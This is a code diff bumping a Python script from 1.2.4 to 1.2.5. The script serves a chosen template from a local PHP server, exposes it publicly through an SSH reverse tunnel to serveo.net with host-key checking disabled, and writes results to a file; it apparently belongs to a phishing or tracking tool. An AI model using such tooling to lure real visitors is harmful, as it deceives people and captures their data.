@@ -1,6 +1,28 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
+R = '\033[31m' # red
+G = '\033[32m' # green
+C = '\033[36m' # cyan
+W = '\033[0m'  # white
+
+from shutil import which
+
+print(G + '[+]' + C + ' Checking Dependencies...' + W)
+pkgs = ['python3', 'pip3', 'php', 'ssh']
+inst = True
+for pkg in pkgs:
+	present = which(pkg)
+	if present == None:
+		print(R + '[-] ' + W + pkg + C + ' is not Installed!')
+		inst = False
+	else:
+		pass
+if inst == False:
+	exit()
+else:
+	pass
+
 import os
 import csv
 import sys
@@ -9,11 +31,6 @@ import json
 import argparse
 import requests
 import subprocess as subp
-
-R = '\033[31m' # red
-G = '\033[32m' # green
-C = '\033[36m' # cyan
-W = '\033[0m'  # white
 
 parser = argparse.ArgumentParser()
 parser.add_argument('-s', '--subdomain', help='Provide Subdomain for Serveo URL ( Optional )')
@@ -28,10 +45,9 @@ tunnel_mode = args.tunnel
 port = args.port
 
 row = []
-site = ''
 info = ''
 result = ''
-version = '1.2.4'
+version = '1.2.5'
 
 def banner():
 	print (G +
@@ -94,7 +110,7 @@ def template_select():
 		print('\n' + R + '[-]' + C + ' Invalid Input!' + W + '\n')
 		sys.exit()
 	
-	print('\n' + G + '[+]' + C + ' Loading {} Template...'.format(templ_json['templates'][selected]['name']) + W + '\n')
+	print('\n' + G + '[+]' + C + ' Loading {} Template...'.format(templ_json['templates'][selected]['name']) + W)
 	
 	module = templ_json['templates'][selected]['module']
 	if module == True:
@@ -108,7 +124,7 @@ def template_select():
 	result = 'template/{}/php/result.txt'.format(site)
 
 def serveo():
-	global site, subdom
+	global subdom
 	flag = False
 
 	print(G + '[+]' + C + ' Checking Serveo Status...', end='')
@@ -118,21 +134,21 @@ def serveo():
 		rqst = requests.get('https://serveo.net', timeout=5)
 		sc = rqst.status_code
 		if sc == 200:
-			print(C + '[' + G + ' UP ' + C + ']' + W + '\n')
+			print(C + '[' + G + ' Online ' + C + ']' + W + '\n')
 		else:
 			print(C + '[' + R + 'Status : {}'.format(sc) + C + ']' + W + '\n')
 			exit()
 	except requests.ConnectionError:
-		print(C + '[' + R + ' DOWN ' + C + ']' + W + '\n')
+		print(C + '[' + R + ' Offline ' + C + ']' + W + '\n')
 		exit()
 			
 	print(G + '[+]' + C + ' Getting Serveo URL...' + W + '\n')
 	if subdom is None:
 		with open('logs/serveo.txt', 'w') as tmpfile:
-			proc = subp.Popen(['ssh', '-oStrictHostKeyChecking=no', '-R', '80:localhost:{}'.format(port), 'serveo.net'], stdout=tmpfile, stderr=tmpfile, stdin=subp.PIPE)
+			proc = subp.Popen(['ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'ServerAliveInterval=60', '-R', '80:localhost:{}'.format(port), 'serveo.net'], stdout=tmpfile, stderr=tmpfile, stdin=subp.PIPE)
 	else:
 		with open('logs/serveo.txt', 'w') as tmpfile:
-			proc = subp.Popen(['ssh', '-oStrictHostKeyChecking=no', '-R', '{}.serveo.net:80:localhost:{}'.format(subdom, port), 'serveo.net'], stdout=tmpfile, stderr=tmpfile, stdin=subp.PIPE)
+			proc = subp.Popen(['ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'ServerAliveInterval=60', '-R', '{}.serveo.net:80:localhost:{}'.format(subdom, port), 'serveo.net'], stdout=tmpfile, stderr=tmpfile, stdin=subp.PIPE)
 	
 	while True:
 		with open('logs/serveo.txt', 'r') as tmpfile:
@@ -143,8 +159,7 @@ def serveo():
 						if 'HTTP' in elem:
 							elem = elem.split(' ')
 							url = elem[4].strip()
-							url = url + '/{}/'.format(site)
-							print(G + '[+]' + C + ' URL : ' + W + url)
+							print(G + '[+]' + C + ' URL : ' + W + url + '\n')
 							flag = True
 						else:
 							pass
@@ -156,7 +171,6 @@ def serveo():
 		time.sleep(2)
 
 def server():
-	global site
 	print('\n' + G + '[+]' + C + ' Port : '+ W + str(port))
 	print('\n' + G + '[+]' + C + ' Starting PHP Server......' + W, end='')
 	with open('logs/php.log', 'w') as phplog:
